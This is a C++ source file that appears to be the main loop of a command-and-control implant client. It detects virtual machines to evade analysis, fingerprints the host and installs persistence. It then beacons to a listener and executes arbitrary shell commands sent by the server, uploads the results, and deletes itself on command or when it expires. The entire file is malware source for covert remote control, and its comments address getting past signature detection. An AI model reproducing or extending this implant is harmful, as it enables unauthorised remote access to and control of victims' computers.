#include <nlohmann/json.hpp>

#include <iostream>
#include <string>
#include <stdio.h>
#include <stdlib.h>

#include "globals.hpp"
#include "local.hpp"
#include "task.hpp"
#include "evasion.hpp"
#include "persist.hpp"
#include "net.hpp"

//only inclue the exact functions you need for client to work

using namespace nlohmann;

//put random string here for sig. detection purposes.

int main(int argc, char** argv)
{
    std::cout << "ZITI" << std::endl;
    //Pause
    //sleep(10);//change to something significant

    //Check VM
    if (Potevade::checkVM() && NO_VM)
    {
        std::cout << "VM DETECTED" << std::endl;
        goto EXIT;
    }
    //Get Enviroment Info
    Potlocal::fingerprint();
    //Check Expiration
    if (Potevade::checkExpire())
    {
        Potpersist::removePersist();
        goto EXIT;
    }
    //Set Persistence
    if (PERSIST_ON)
    {
        Potpersist::setPersist(argv[0]); //double check to make sure this works
    }
    //Check Listener
    //check initialization
    while(true)
    {
        //CHECK: {}
        if (Potnet::checkListener())
        {
            Potnet::ping();
        }
        while (CONN_OK)//need to check that uploadLog() doesn't interfere with this loop
        {
            TASK_STATUS current_task_state = Pottask::readTask();
            if (current_task_state == TASK)
            {
                //execTask();
                while(!task_array.empty())
                {
                    for (const auto& current_task : task_array.items())//executes tasks out of order?
                    {
                        std::cout << current_task.value() << std::endl;//test
                        switch (Pottask::switchTask(current_task.value()))
                        {
                            case COMMAND:
                                //run command
                                Pottask::addLog(current_task.value(), Potlocal::passCommand(current_task.value()["task_cmd_input"]));
                                //send log//if success
                                Pottask::uploadLog();
                                break;
                            case PING:
                                //ping
                                Potnet::ping();
                                //send log//if success
                                Pottask::addLog(current_task.value(), "Ping Sent");
                                Pottask::uploadLog();
                                break;
                            case CONFIG://triggers for some reason, sends bad log to server
                                //update config
                                //send log//if success
                                Pottask::addLog(current_task.value(), "Client Configured");
                                Pottask::uploadLog();
                                break;
                            case PERSIST:
                                //set persistence
                                Potpersist::setPersist(argv[0]);
                                //send log//if success
                                Pottask::addLog(current_task.value(), "Persistence Set");
                                Pottask::uploadLog();
                                break;
                            case SHUTDOWN:
                                //send log
                                Pottask::addLog(current_task.value(), "Shutdown Initiated");
                                Pottask::uploadLog();
                                goto EXIT;
                            case DELETE:
                                //run cleanup
                                Potpersist::removePersist();
                                //send log
                                Pottask::addLog(current_task.value(), "Client Deleted");
                                Pottask::uploadLog();
                                goto EXIT;
                        }
                    //erase current task
                        task_array.erase(task_array.begin());
                    }
                }
            }
            else if (current_task_state == NOTASK)
            {
                //clear log_array if logs in queue
                if (!log_array.empty())
                {
                    Pottask::uploadLog();
                }
                //system checks, etc go here
                sleep(15); //have this be a variable
            }
            else if (current_task_state == CONNERROR)
            {
                sleep(15); //have this be a variable
            }
        }
    }
    EXIT: {}
    Potpersist::removePersist();//for testing
    return 0;
}
